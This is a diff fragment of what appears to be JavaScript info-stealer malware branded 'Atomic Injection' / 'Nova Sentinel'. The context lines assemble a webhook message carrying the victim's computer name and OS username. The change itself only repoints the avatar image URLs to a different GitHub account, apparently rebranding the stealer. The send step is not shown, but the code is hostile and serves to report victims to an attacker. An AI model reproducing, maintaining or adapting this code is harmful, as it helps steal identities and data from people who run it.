@@ -7875,7 +7875,7 @@ const username = os.userInfo().username;
               var payload = JSON.stringify({
                 username: "Atomic Injection",
                 avatar_url:
-                  "https://raw.githubusercontent.com/familigy/sub/main/assets/lilnova.png",
+                  "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png",
                   content: "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
                 embeds: [
                   {
@@ -7884,7 +7884,7 @@ const username = os.userInfo().username;
                     footer: {
                       text: "@Nova Sentinel | https://t.me/Sordeal",
                       icon_url:
-                        "https://raw.githubusercontent.com/familigy/sub/main/assets/gifnova.gif",
+                        "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/gifnova.gif",
                     },
                     fields: [
                       {
